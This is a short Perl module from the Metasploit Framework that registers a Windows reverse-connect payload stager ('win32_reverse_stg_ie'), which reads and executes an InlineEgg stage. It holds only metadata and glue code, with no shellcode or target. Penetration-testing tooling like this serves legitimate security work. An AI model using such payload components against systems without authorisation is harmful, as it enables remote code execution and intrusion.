##
# This file is part of the Metasploit Framework and may be redistributed according
# to the licenses defined in the Authors fields below. In the case of a an Unknown
# license, this file defaults to using the same license as the core Framework. The
# latest version of the Framework can always be obtained from http://metasploit.com
##

package Msf::Payload::win32_reverse_stg_ie;
use strict;
use base 'Msf::PayloadComponent::Win32StagePayloadIE';
sub load {
  Msf::PayloadComponent::Win32StagePayloadIE->import('Msf::PayloadComponent::Win32ReverseStagerIE');
}

my $info =
{
  'Name'         => 'winreverse_stg_ie',
  'Version'  => '$Revision$',
  'Description'  => 'Listen for connection, send address of GP/LL across, read/exec InlineEgg',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'UserOpts'	   =>
    {
      'IEGG' => [1, 'PATH', 'Path to InlineEgg stage'],
    },
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
